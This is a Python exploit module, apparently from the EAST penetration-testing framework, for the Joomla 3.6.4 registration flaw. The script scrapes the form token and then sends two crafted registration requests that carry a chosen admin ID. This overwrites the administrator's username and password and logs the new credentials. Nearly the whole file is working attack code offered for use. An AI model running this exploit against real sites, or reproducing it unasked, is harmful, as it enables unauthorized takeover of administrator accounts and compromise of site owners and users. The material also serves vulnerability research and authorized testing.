#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import re
import requests
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_joomla3_admin_takeover"
INFO['DESCRIPTION'] = "Joomla! <= 3.6.4 Admin TakeOver"
INFO['VENDOR'] = "https://joomla.org"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41157/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Incorrect filtering of registration form data stored to the session on a validation error enables a user to gain access to a registered user's account and reset the user's group mappings, username, and password, as demonstrated by submitting a form that targets the `registration.register` task.

You need to know admin id to use this technique, or you can brute force to find it.
"""

INFO['CHANGELOG'] = "26 Jan, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/joomla3', dict(description = 'Basepath of Joomla')
OPTIONS['ID'] = 500, dict(description = 'Admin ID')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.id = OPTIONS['ID']
        self.basepath = OPTIONS["BASEPATH"]
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.id = int(self.args.get('ID', OPTIONS['ID']))
        self.basepath = self.args.get('BASEPATH', self.basepath)
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
            
        username = 'EastUser'
        email = username + '@eastfw.com'
        password = 'password'
        
        user_data = {
            'name': username,
            'username': username,
            'password1': password,
            'password2': password + 'wrong',
            'email1': email,
            'email2': email,
            'id': self.id
        }
        
        data = {}
        data ['jform[name]'] = ''
        data ['jform[username]'] = ''
        data ['jform[password1]'] = ''
        data ['jform[password2]'] = ''
        data ['jform[email1]'] = ''
        data ['jform[email2]'] = ''
        data ['option'] = 'com_users'
        data ['task'] = 'registration.register'
        
        session = requests.Session()
        response = session.get(self.make_url('/index.php/component/users/?view=registration'))
        token = re.findall('<input type="hidden" name="(.*)" value=',response.text)[-1]
        self.log('Found token:' + token)
        
        data[token] = 1
        
        user_data = {'jform[%s]' % k: v for k, v in user_data.items()}
        data.update(user_data)

        response = session.post(self.make_url('/index.php/component/users/?task=registration.register'), data=data)
        data['jform[password2]'] = data['jform[password1]']
        del data['jform[id]']
        response = session.post(self.make_url('/index.php/component/users/?task=registration.register'), data=data)
        self.log("Account created for user: {}:{} [{}]".format(username, password, email))
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
